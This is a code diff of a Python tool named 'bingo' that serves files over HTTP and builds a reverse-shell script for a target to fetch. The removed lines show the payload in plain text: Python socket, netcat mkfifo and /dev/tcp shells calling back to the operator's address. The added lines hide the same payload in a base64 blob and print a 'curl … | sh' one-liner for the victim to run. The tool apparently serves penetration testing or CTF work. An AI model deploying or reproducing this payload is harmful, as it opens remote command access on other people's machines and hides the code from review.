@@ -1,81 +1,108 @@
-#! /usr/bin/python3
+#!/usr/bin/env python3
 
 import http.server
-import socketserver
-import os
-import argparse
-import netifaces as ni
-import pyfiglet
-from random import randint
+from argparse import ArgumentParser
+from base64 import b64decode
+from netifaces import interfaces, ifaddresses, AF_INET
+from os.path import basename, exists
+from os import remove
+from pyfiglet import figlet_format
+from random import choice
+from sys import stderr, exit
+from socketserver import TCPServer
 from termcolor import colored
-import sys
 
-def makebanner():
-	colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
-	fonts=["smslant", "crawford","cursive","pyramid","stacey","slant","5lineoblique","ticks","contessa","hex","pawp","block","graffiti","linux","charact3","bulbhead"]
-	colorsint = randint(0, 5)
-	fontsint = randint(0, 15)
-	font = fonts[fontsint]
-	banner = pyfiglet.figlet_format("bingo", font = font)
-	print(colored(banner, colors[colorsint]))
 
-makebanner()
+def print_info(*args):
+    for info in args:
+        print(f"[{colored('info', 'green')}] {info}")
 
-parser = argparse.ArgumentParser(description = 'Tool to start a python http server in a simple way, with support a reverse shell.')
-parser.add_argument('-p', action = 'store', dest = 'port', default = 8000, required = False, type = int, help = 'Port to open http server.')
-parser.add_argument('-rs', action = 'store', dest = 'reverse_shell_port', required = False, help = 'To open a reverse shell code. (specify port)')
-arguments = parser.parse_args()
 
-port = arguments.port
+def perror(err):
+    stderr.write(f"[{colored('error', 'red')}] {err}\n")
+    exit(1)
 
-interfaces = ni.interfaces()
-if "tun0" in interfaces:
-    interface = "tun0" 
-elif "eth0" in interfaces:
-	interface = "eth0"
-elif "wlan0" in interfaces:
-	interface = "wlan0"
 
-def main():
-	global arguments
-	ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
-	if arguments.reverse_shell_port:
-		revfile = """
+def gen_reverse_shell(ip, port):
+    with open('bingors', 'w') as f:
+        f.write(b64decode("aWYgY29tbWFuZCAtdiBweXRob24gPiAvZGV2L251bGwgMj4mMT"
+                          "sgdGhlbgogIHB5dGhvbiAtYyAnaW1wb3J0IHNvY2tldCxzdWJw"
+                          "cm9jZXNzLG9zOyBzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0"
+                          "lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsgcy5jb25uZWN0KCgi"
+                          "e2lwfSIse3BvcnR9KSk7IG9zLmR1cDIocy5maWxlbm8oKSwwKT"
+                          "sgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmls"
+                          "ZW5vKCksMik7IHA9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaC"
+                          "IsIi1pIl0pOycKICBleGl0OwpmaQoKaWYgY29tbWFuZCAtdiBu"
+                          "YyA+IC9kZXYvbnVsbCAyPiYxOyB0aGVuCiAgcm0gL3RtcC9mO2"
+                          "1rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+"
+                          "JjF8bmMge2lwfSB7cG9ydH0gPi90bXAvZgogIGV4aXQ7CmZpCg"
+                          "ppZiBjb21tYW5kIC12IHNoID4gL2Rldi9udWxsIDI+JjE7IHRo"
+                          "ZW4KICAvYmluL3NoIC1pID4mIC9kZXYvdGNwL3tpcH0ve3Bvcn"
+                          "R9IDA+JjEKICBleGl0Owpm"
+                          ).decode('utf-8').format(ip=ip, port=port))
 
-		if command -v python > /dev/null 2>&1; then
-			python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{0}",{1})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
-			exit;
-		fi
 
-		if command -v nc > /dev/null 2>&1; then
-			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f
-			exit;
-		fi
+colors = ('red', 'green', 'blue', 'cyan', 'magenta')
+fonts = ('smslant', 'crawford', 'cursive', 'block',
+         'pyramid', 'stacey', 'contessa', 'pawp',
+         '5lineoblique', 'linux', 'charact3', 'hex',
+         'pawp', 'bulbhead', 'slant', 'graffiti')
 
-		if command -v sh > /dev/null 2>&1; then
-			/bin/sh -i >& /dev/tcp/{0}/{1} 0>&1
-			exit;
-		fi """.format(ip, arguments.reverse_shell_port)
-		
-		if os.path.exists("bingors"):
-			os.remove("bingors")
-		
-		revfileh = open("bingors", "w")
-		revfileh.write(revfile)
-		revfileh.close()
+banner = figlet_format('bingo', font=choice(fonts))
+print(colored(banner, choice(colors)))
 
-	handler = http.server.SimpleHTTPRequestHandler
-	with socketserver.TCPServer(("", port), handler) as httpd:
-	    print("HTTP server opened on port", port)
-	    print("Url:","http://"+str(ip)+":"+str(port))
-	    if arguments.reverse_shell_port:
-		    message = "CMD: curl http://"+str(ip)+":"+str(port)+"/bingors"+"|"+"sh"
-		    print(message)
-	    httpd.serve_forever()
+parser = ArgumentParser(description='A tool to start a Python3 http server in'
+                                    ' a simple way with reverse shell support')
+parser.add_argument('-p', '--port', action='store', dest='http_port',
+                    default=8000, type=int, help='HTTP server port')
+parser.add_argument('-r', '--reverse-shell', action='store',
+                    dest='remote_port', type=int,
+                    help='Generate a reverse shell with given port')
+parser.add_argument('-i', '--net-iface', action='store', dest='interface',
+                    type=str,
+                    help='Use a given network interface')
+parser.add_argument('--list-interfaces', action='store_true',
+                    dest='list_interfaces',
+                    help='List all available network interfaces')
+
+args = parser.parse_args()
+net_ifaces = interfaces()
+
+if args.interface and args.interface not in net_ifaces:
+    perror(f"the interface '{args.interface}' is not available"
+           f" See: {basename(__file__)} --list-interfaces")
+else:
+    args.interface = net_ifaces[0]
+
+
+if args.list_interfaces:
+    print_info(f'Available network interfaces:')
+    print(f"\t{', '.join(net_ifaces)}")
+
+
+ip = ifaddresses(args.interface)[AF_INET][0]['addr']
+
+if args.remote_port:
+    gen_reverse_shell(ip, args.remote_port)
+    print_info("The reverse shell was generated!\n"
+               f"- Filename: bingors\n"
+               f"- Interface: {args.interface}\n"
+               f"- IP: {ip}\n"
+               f"- Port: {args.remote_port}\n")
+
+handler = http.server.SimpleHTTPRequestHandler
+
 try:
-	main()
+    with TCPServer(('', args.http_port), handler) as httpd:
+        addr = f'http://{ip}:{args.http_port}'
+        print_info(f"HTTP server was started on {addr}")
+
+        if args.remote_port:
+            print_info(f"Reverse shell: curl {addr}/bingors | sh")
+
+        httpd.serve_forever()
 except KeyboardInterrupt:
-	print(colored("\nExit", "red"))
-	if os.path.exists("bingors"):
-			os.remove("bingors")
-	exit()
+    httpd.server_close()
+    if exists('bingors'):
+        remove('bingors') # Delete reverse shell file
+    print("\rProgram finished! (CTRL + C)")
